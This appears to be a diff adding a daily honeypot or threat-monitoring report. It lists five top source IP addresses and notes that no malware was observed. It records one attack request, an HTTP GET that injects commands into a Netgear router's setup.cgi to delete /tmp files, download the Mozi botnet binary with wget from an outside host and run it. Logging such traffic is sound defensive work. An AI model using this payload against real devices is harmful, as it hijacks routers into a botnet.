@@ -1,0 +1,15 @@
+Top 5 IPs for 01-08-2024 :
+
+103.212.211.140
+91.187.99.27
+170.64.150.188
+111.67.197.171
+59.27.209.135
+
+Malware Observed:
+
+None observed
+
+Commands/exploits observed:
+
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.89.198.90:40827/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
